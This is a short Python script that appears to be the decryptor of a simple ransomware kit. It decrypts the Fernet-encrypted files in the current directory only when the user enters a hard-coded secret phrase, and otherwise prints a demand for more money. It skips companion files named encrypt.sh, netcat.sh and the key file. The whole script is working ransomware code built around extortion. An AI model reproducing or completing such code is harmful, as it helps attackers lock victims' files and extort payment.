#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == "decrypt.sh" or file == "encrypt.sh" or file == "netcat.sh" or file == "thekey.key":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)
with open("thekey.key", "rb") as key:
	secretkey = key.read()
	
secretphrase = "dp"
user_phrase = input("Enter the secret phrase to decrypt your files\n")
if user_phrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents) 
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Congrats, you're files are decrypted.")
else:
	print("Sorry, wrong secret phrase. Send me more money!"),